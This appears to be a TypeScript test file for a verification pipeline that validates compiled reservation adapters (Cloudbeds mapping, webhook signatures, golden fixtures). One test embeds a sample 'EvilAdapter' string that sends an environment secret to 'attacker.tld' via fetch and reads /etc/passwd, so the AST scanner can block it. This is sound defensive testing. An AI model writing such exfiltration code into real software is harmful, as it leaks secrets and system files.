import * as crypto from 'crypto';
import { AdapterCompiler } from '@lattice/codegen';
import { MappingSpecSchema } from '@lattice/mapping-spec';
import { VerificationPipeline } from './pipeline';
import { AstSecurityScanner } from './stage2-ast-scan';
import * as cloudbedsSpecJson from '../../../fixtures/cloudbeds/cloudbeds.reference-spec.json';

describe('6-Stage Verification Pipeline & Sandbox', () => {
  const rawPartnerSample = {
    reservation_id: 'cb_1001',
    property_id: 'prop_zamalek_1',
    room_identifier: 'suite_4B',
    guest_first_name: 'Nour',
    guest_last_name: 'El-Din',
    guest_email: 'nour@example.com',
    start_date: '2026-11-01T00:00:00Z',
    end_date: '2026-11-05T00:00:00Z',
    booking_status: 'reserved',
    total_cents: 85000,
    currency_code: 'usd',
    modified_at: '2026-10-14T10:00:00Z',
  };

  const expectedCanonical = {
    tenantId: 'unassigned',
    propertyId: 'prop_zamalek_1',
    unitId: 'suite_4B',
    guestName: 'Nour El-Din',
    guestEmail: 'nour@example.com',
    checkIn: '2026-11-01',
    checkOut: '2026-11-05',
    status: 'CONFIRMED' as const,
    totalAmount: 850,
    currency: 'USD',
  };

  it('passes all 6 verification stages for the compiled Cloudbeds adapter', async () => {
    const spec = MappingSpecSchema.parse(cloudbedsSpecJson);
    const compiled = await AdapterCompiler.compile(spec);

    const secret = 'whsec_test_99';
    const timestamp = '1760440000';
    const rawBody = JSON.stringify(rawPartnerSample);
    const sig = crypto.createHmac('sha256', secret).update(`${timestamp}.${rawBody}`).digest('hex');

    const report = VerificationPipeline.runAll({
      adapterFileName: compiled.adapterFileName,
      adapterCode: compiled.adapterCode,
      spec,
      goldenFixtures: [
        {
          sampleId: 'sample-1',
          label: 'standard-reservation',
          isHeldOut: false,
          rawPartnerPayload: rawPartnerSample,
          expectedCanonical,
        },
      ],
      heldOutFixtures: [
        {
          sampleId: 'holdout-1',
          label: 'cancelled-reservation',
          isHeldOut: true,
          rawPartnerPayload: {
            ...rawPartnerSample,
            reservation_id: 'cb_1002',
            booking_status: 'void',
          },
          expectedCanonical: {
            ...expectedCanonical,
            status: 'CANCELLED',
          },
        },
      ],
      webhookVector: {
        rawBody,
        secret,
        headers: {
          'x-cloudbeds-signature': sig,
          'x-cloudbeds-timestamp': timestamp,
          'x-event-id': 'evt_cb_99',
        },
        expectedValid: true,
        expectedEventId: 'evt_cb_99',
      },
    });

    expect(report.allPassed).toBe(true);
    expect(report.failedStage).toBeNull();
    expect(report.stages).toHaveLength(6);
  });

  it('Stage 2 (AST_SCAN) blocks malicious code using fetch, process.env, or fs', () => {
    const maliciousCode = `
      import * as fs from 'fs';
      export class EvilAdapter {
         steal() {
           fetch('https://attacker.tld?key=' + process.env.SECRET);
           return fs.readFileSync('/etc/passwd');
         }
      }
    `;

    const scan = AstSecurityScanner.verify('evil.adapter.ts', maliciousCode);
    expect(scan.passed).toBe(false);
    expect(scan.diagnostics.map((d) => d.code)).toContain('AST_FORBIDDEN_IMPORT');
    expect(scan.diagnostics.map((d) => d.code)).toContain('AST_BANNED_IDENTIFIER');
  });

  it('Stage 3 (GOLDEN) catches swapped checkIn and checkOut fields immediately', async () => {
    const mutatedSpec = JSON.parse(JSON.stringify(cloudbedsSpecJson));
    // Intentionally swap checkIn and checkOut source paths
    const checkInField = mutatedSpec.fields.find((f: any) => f.canonicalField === 'checkIn');
    const checkOutField = mutatedSpec.fields.find((f: any) => f.canonicalField === 'checkOut');
    checkInField.source.path = '$.end_date';
    checkOutField.source.path = '$.start_date';

    const spec = MappingSpecSchema.parse(mutatedSpec);
    const compiled = await AdapterCompiler.compile(spec);

    const report = VerificationPipeline.runAll({
      adapterFileName: compiled.adapterFileName,
      adapterCode: compiled.adapterCode,
      spec,
      goldenFixtures: [
        {
          sampleId: 'sample-1',
          label: 'swapped-dates-check',
          isHeldOut: false,
          rawPartnerPayload: rawPartnerSample,
          expectedCanonical,
        },
      ],
      heldOutFixtures: [],
    });

    expect(report.allPassed).toBe(false);
    expect(report.failedStage).toBe('GOLDEN');
    expect(report.stages[2].diagnostics[0].field).toBe('checkIn');
    expect(report.stages[2].diagnostics[0].expected).toBe('2026-11-01');
    expect(report.stages[2].diagnostics[0].actual).toBe('2026-11-05');
  });
});